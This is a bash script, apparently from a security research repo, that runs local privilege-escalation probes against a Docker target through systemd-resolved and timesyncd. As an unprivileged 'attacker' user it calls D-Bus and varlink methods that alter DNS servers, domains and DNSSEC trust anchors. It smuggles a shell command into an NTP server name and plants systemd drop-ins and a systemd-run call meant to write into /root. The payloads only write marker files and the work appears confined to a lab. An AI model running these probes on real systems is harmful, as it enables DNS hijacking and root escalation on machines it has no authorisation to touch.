#!/usr/bin/env bash
set -Eeuo pipefail

container="${1:-ubuntu24-server-lpe-target}"
repo_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
log_path="$repo_dir/logs/timesync-resolved-runtime.out"

mkdir -p "$repo_dir/logs"
: >"$log_path"
exec > >(tee -a "$log_path") 2>&1

echo "timesync/resolved runtime D-Bus and varlink LPE probe"
echo "target=$container"
date '+%Y-%m-%dT%H:%M:%S%z'

if [[ "$(docker inspect -f '{{.State.Running}}' "$container" 2>/dev/null || true)" != "true" ]]; then
  echo "target container is not running: $container" >&2
  exit 1
fi

docker exec -i "$container" bash -s <<'TARGET'
set +e
export LC_ALL=C

PROBE_BASE=/tmp/timesync-resolved-runtime-probe
ROOT_MARKER=/root/timesync_resolved_runtime_lpe
TMP_MARKER=/tmp/timesync_resolved_runtime_lpe

rm -rf "$PROBE_BASE" "$TMP_MARKER"
rm -f "$ROOT_MARKER"
mkdir -p "$PROBE_BASE"
chmod 1777 "$PROBE_BASE"

section() {
  printf '\n## %s\n' "$1"
}

run_cmd() {
  local label="$1"
  shift
  printf '\n### %s\n' "$label"
  printf '$'
  printf ' %q' "$@"
  printf '\n'
  "$@"
  printf 'rc=%s\n' "$?"
}

as_user() {
  local user="$1"
  local label="$2"
  shift 2
  printf '\n### as %s: %s\n' "$user" "$label"
  runuser -u "$user" -- bash -lc "$*"
  printf 'rc=%s\n' "$?"
}

snapshot_state() {
  local label="$1"
  section "$label"
  for path in \
    /etc/systemd/timesyncd.conf \
    /etc/systemd/resolved.conf \
    /run/systemd/resolve \
    /run/systemd/resolve/resolv.conf \
    /run/systemd/resolve/stub-resolv.conf \
    /run/systemd/resolve/io.systemd.Resolve \
    /run/systemd/resolve/io.systemd.Resolve.Monitor \
    /run/systemd/timesync \
    /run/systemd/netif \
    /run/systemd/system \
    /run/systemd/generator \
    /run/systemd/generator.early \
    /run/systemd/generator.late \
    /run/credentials \
    /run/dbus-1/system-services \
    "$ROOT_MARKER" \
    "$TMP_MARKER"; do
    if [ -e "$path" ] || [ -L "$path" ]; then
      stat -Lc '%A %U:%G %s %Y %n -> %N' "$path" 2>&1
      if [ -f "$path" ]; then
        sha256sum "$path" 2>&1
      fi
    else
      parent="${path%/*}"
      printf 'MISSING %s parent=' "$path"
      stat -Lc '%A %U:%G %n' "$parent" 2>&1 || true
    fi
  done
  find /run/systemd/resolve -maxdepth 2 -printf '%M %u:%g %p -> %l\n' 2>/dev/null | sort
  find /run/systemd/timesync -maxdepth 2 -printf '%M %u:%g %p -> %l\n' 2>/dev/null | sort
}

section "target identity and package proof"
uname -a
sed -n '1,12p' /etc/os-release
systemctl --version | head -1
dpkg-query -W -f='${binary:Package}\t${Version}\t${Architecture}\t${db:Status-Abbrev}\n' \
  dbus dbus-daemon polkitd systemd systemd-resolved systemd-timesyncd 2>&1 | sort
id attacker
id systemd-resolve
id systemd-timesync
groups attacker
getent group sudo adm docker lxd systemd-journal systemd-resolve systemd-timesync || true

section "default unit and bus reachability"
systemctl is-enabled systemd-resolved.service systemd-timesyncd.service dbus-org.freedesktop.resolve1.service dbus-org.freedesktop.timesync1.service 2>&1
systemctl is-active systemd-resolved.service systemd-timesyncd.service dbus-org.freedesktop.resolve1.service dbus-org.freedesktop.timesync1.service 2>&1
systemctl show -p FragmentPath -p UnitFileState -p ActiveState -p SubState -p MainPID -p User -p DynamicUser \
  -p ConditionResult -p Conditions -p BusName -p ExecStart -p AmbientCapabilities -p CapabilityBoundingSet \
  -p NoNewPrivileges -p ProtectSystem -p RuntimeDirectory -p RuntimeDirectoryPreserve -p StateDirectory \
  systemd-resolved.service systemd-timesyncd.service 2>&1
busctl --system list --no-pager | egrep 'resolve1|timesync1|systemd-resolved|systemd-timesync' || true
ss -xlpn 2>/dev/null | egrep 'resolve|timesync|varlink' || true
ss -lntup 2>/dev/null | egrep ':53|resolve|timesync' || true

section "unit files and D-Bus/polkit policy"
for unit in systemd-resolved.service systemd-timesyncd.service dbus-org.freedesktop.resolve1.service dbus-org.freedesktop.timesync1.service; do
  printf '\n### unit %s\n' "$unit"
  systemctl cat "$unit" --no-pager 2>&1 | sed -n '1,160p'
done
for file in \
  /usr/share/dbus-1/system.d/org.freedesktop.resolve1.conf \
  /usr/share/dbus-1/system.d/org.freedesktop.timesync1.conf \
  /usr/share/dbus-1/system-services/org.freedesktop.resolve1.service \
  /usr/share/dbus-1/system-services/org.freedesktop.timesync1.service \
  /usr/share/polkit-1/actions/org.freedesktop.resolve1.policy \
  /usr/share/polkit-1/actions/org.freedesktop.timesync1.policy; do
  printf '\n### file %s\n' "$file"
  sed -n '1,220p' "$file" 2>&1
done

snapshot_state "root-owned runtime state before"

section "D-Bus and varlink method surfaces"
run_cmd "resolve1 manager introspection" busctl --system introspect org.freedesktop.resolve1 /org/freedesktop/resolve1 org.freedesktop.resolve1.Manager --no-pager
run_cmd "timesync1 manager introspection/activation" timeout 30 busctl --system introspect org.freedesktop.timesync1 /org/freedesktop/timesync1 org.freedesktop.timesync1.Manager --no-pager
run_cmd "public resolve varlink info" varlinkctl info /run/systemd/resolve/io.systemd.Resolve
run_cmd "public resolve varlink IDL" varlinkctl introspect /run/systemd/resolve/io.systemd.Resolve io.systemd.Resolve
run_cmd "private resolve monitor varlink info as root" varlinkctl info /run/systemd/resolve/io.systemd.Resolve.Monitor

section "attacker D-Bus probes"
ifidx="$(ip -o link show | awk -F': ' '$2 !~ /lo/ {print $1; exit}')"
printf 'selected_non_loopback_ifindex=%s\n' "$ifidx"
runuser -u attacker -- bash -s -- "$ifidx" <<'ATTACKER'
set +e
export LC_ALL=C
ifidx="$1"
id
for cmd in \
  "busctl --system get-property org.freedesktop.resolve1 /org/freedesktop/resolve1 org.freedesktop.resolve1.Manager DNS" \
  "busctl --system call org.freedesktop.resolve1 /org/freedesktop/resolve1 org.freedesktop.resolve1.Manager FlushCaches" \
  "busctl --system call org.freedesktop.resolve1 /org/freedesktop/resolve1 org.freedesktop.resolve1.Manager ResetStatistics" \
  "busctl --system call org.freedesktop.resolve1 /org/freedesktop/resolve1 org.freedesktop.resolve1.Manager ResetServerFeatures" \
  "busctl --system call org.freedesktop.resolve1 /org/freedesktop/resolve1 org.freedesktop.resolve1.Manager ResolveHostname isit 0 localhost 2 0" \
  "busctl --system call org.freedesktop.resolve1 /org/freedesktop/resolve1 org.freedesktop.resolve1.Manager SetLinkDNS 'ia(iay)' $ifidx 1 2 4 8 8 8 8" \
  "busctl --system call org.freedesktop.resolve1 /org/freedesktop/resolve1 org.freedesktop.resolve1.Manager SetLinkDNSEx 'ia(iayqs)' $ifidx 1 2 4 8 8 4 4 53 dns.example" \
  "busctl --system call org.freedesktop.resolve1 /org/freedesktop/resolve1 org.freedesktop.resolve1.Manager SetLinkDomains 'ia(sb)' $ifidx 1 attacker.invalid false" \
  "busctl --system call org.freedesktop.resolve1 /org/freedesktop/resolve1 org.freedesktop.resolve1.Manager SetLinkDefaultRoute ib $ifidx true" \
  "busctl --system call org.freedesktop.resolve1 /org/freedesktop/resolve1 org.freedesktop.resolve1.Manager SetLinkLLMNR is $ifidx yes" \
  "busctl --system call org.freedesktop.resolve1 /org/freedesktop/resolve1 org.freedesktop.resolve1.Manager SetLinkMulticastDNS is $ifidx yes" \
  "busctl --system call org.freedesktop.resolve1 /org/freedesktop/resolve1 org.freedesktop.resolve1.Manager SetLinkDNSOverTLS is $ifidx yes" \
  "busctl --system call org.freedesktop.resolve1 /org/freedesktop/resolve1 org.freedesktop.resolve1.Manager SetLinkDNSSEC is $ifidx yes" \
  "busctl --system call org.freedesktop.resolve1 /org/freedesktop/resolve1 org.freedesktop.resolve1.Manager SetLinkDNSSECNegativeTrustAnchors ias $ifidx 1 attacker.invalid" \
  "busctl --system call org.freedesktop.resolve1 /org/freedesktop/resolve1 org.freedesktop.resolve1.Manager RevertLink i $ifidx" \
  "busctl --system call org.freedesktop.resolve1 /org/freedesktop/resolve1 org.freedesktop.resolve1.Manager RegisterService 'sssqqqaa{say}' lpe _http._tcp local 0 0 1 0" \
  "busctl --system call org.freedesktop.timesync1 /org/freedesktop/timesync1 org.freedesktop.timesync1.Manager SetRuntimeNTPServers as 2 127.0.0.1 'attacker.invalid;touch /root/timesync_resolved_runtime_lpe'"; do
  printf '\n### %s\n' "$cmd"
  timeout 35 bash -lc "$cmd"
  printf 'rc=%s\n' "$?"
done
ATTACKER

section "attacker varlink probes"
runuser -u attacker -- bash -s <<'ATTACKER'
set +e
export LC_ALL=C
id
for cmd in \
  "varlinkctl info /run/systemd/resolve/io.systemd.Resolve" \
  "varlinkctl introspect /run/systemd/resolve/io.systemd.Resolve io.systemd.Resolve" \
  "varlinkctl call /run/systemd/resolve/io.systemd.Resolve io.systemd.Resolve.ResolveHostname '{\"ifindex\":0,\"name\":\"localhost\",\"family\":2,\"flags\":0}'" \
  "varlinkctl call /run/systemd/resolve/io.systemd.Resolve io.systemd.Resolve.ResolveAddress '{\"ifindex\":1,\"family\":2,\"address\":[127,0,0,1],\"flags\":0}'" \
  "varlinkctl call /run/systemd/resolve/io.systemd.Resolve io.systemd.Resolve.SetLinkDNS '{\"ifindex\":2,\"servers\":[\"8.8.8.8\"]}'" \
  "varlinkctl info /run/systemd/resolve/io.systemd.Resolve.Monitor"; do
  printf '\n### %s\n' "$cmd"
  timeout 8 bash -lc "$cmd"
  printf 'rc=%s\n' "$?"
done
ATTACKER

section "service-account write and fixed-unit transition probes"
for user in attacker systemd-resolve systemd-timesync; do
  as_user "$user" "write root-consumed runtime/config paths" '
    set +e
    export LC_ALL=C
    base="/tmp/timesync-resolved-runtime-$USER-$$"
    rm -rf "$base"
    mkdir -p "$base"
    tag="probe_${USER}_$$"

    try_write_dir() {
      d="$1"
      printf "DIR %s writable-test: " "$d"
      : >"$base/err"
      test -d "$d" && test -w "$d" >"$base/out" 2>"$base/err"
      rc=$?
      tr "\n" " " <"$base/err"
      printf " rc=%s\n" "$rc"
    }

    try_mkdir_write() {
      d="$1"
      existed=0
      [ -e "$d" ] && existed=1
      printf "MKDIR %s: " "$d"
      : >"$base/err"
      mkdir -p "$d" >"$base/err" 2>&1
      rc=$?
      tr "\n" " " <"$base/err"
      printf " rc=%s\n" "$rc"
      try_write_dir "$d"
      [ "$existed" = 0 ] && rmdir "$d" 2>/dev/null
    }

    try_file() {
      f="$1"
      printf "FILE %s writable-test: " "$f"
      : >"$base/err"
      test -w "$f" >"$base/out" 2>"$base/err"
      rc=$?
      tr "\n" " " <"$base/err"
      printf " rc=%s\n" "$rc"
    }

    for d in \
      /run/systemd/system \
      /run/systemd/generator \
      /run/systemd/generator.early \
      /run/systemd/generator.late \
      /run/systemd/resolve \
      /run/systemd/timesync \
      /run/dbus-1/system-services \
      /run/credentials \
      /run/credentials/systemd-resolved.service \
      /run/credentials/systemd-timesyncd.service \
      /etc/systemd/system \
      /etc/systemd/resolved.conf.d \
      /etc/systemd/timesyncd.conf.d; do
      try_mkdir_write "$d"
    done

    for f in \
      /etc/systemd/resolved.conf \
      /etc/systemd/timesyncd.conf \
      /run/systemd/resolve/resolv.conf \
      /run/systemd/resolve/stub-resolv.conf; do
      [ -e "$f" ] && try_file "$f"
    done

    rm -rf "$base"
  '
done

section "fixed root unit start attempts from attacker-controlled runtime input"
as_user attacker "start fixed root units after denied runtime writes" '
  set +e
  export LC_ALL=C
  printf "[Service]\nExecStart=/bin/sh -c '\''id > /root/timesync_resolved_runtime_lpe'\''\n" >/tmp/resolved-lpe-dropin.conf
  mkdir -p /tmp/systemd-lpe.service.d
  printf "[Service]\nExecStart=/bin/sh -c '\''id > /root/timesync_resolved_runtime_lpe'\''\n" >/tmp/systemd-lpe.service.d/override.conf
  for cmd in \
    "systemctl start systemd-resolved.service" \
    "systemctl start systemd-timesyncd.service" \
    "systemctl start dbus-org.freedesktop.resolve1.service" \
    "systemctl start dbus-org.freedesktop.timesync1.service" \
    "systemd-run --unit timesync-resolved-runtime-lpe /bin/sh -c '\''id > /root/timesync_resolved_runtime_lpe'\''"; do
    printf "\n### %s\n" "$cmd"
    timeout 8 bash -lc "$cmd"
    printf "rc=%s\n" "$?"
  done
'

snapshot_state "root-owned runtime state after"

section "root proof check"
if [ -e "$ROOT_MARKER" ]; then
  echo "ROOT_MARKER_EXISTS"
  ls -l "$ROOT_MARKER"
  sed -n '1,20p' "$ROOT_MARKER"
else
  echo "no root marker at $ROOT_MARKER"
fi
if [ -e "$TMP_MARKER" ]; then
  echo "TMP_MARKER_EXISTS"
  ls -l "$TMP_MARKER"
  sed -n '1,20p' "$TMP_MARKER"
else
  echo "no tmp marker at $TMP_MARKER"
fi

section "cleanup"
rm -rf "$PROBE_BASE" /tmp/timesync-resolved-runtime-* /tmp/systemd-lpe.service.d /tmp/resolved-lpe-dropin.conf
rm -f "$TMP_MARKER"
if [ -e "$ROOT_MARKER" ]; then
  echo "leaving root marker for proven LPE review: $ROOT_MARKER"
else
  rm -f "$ROOT_MARKER" 2>/dev/null || true
fi
systemctl reset-failed systemd-timesyncd.service dbus-org.freedesktop.timesync1.service 2>/dev/null || true
systemctl is-system-running 2>&1 || true
TARGET
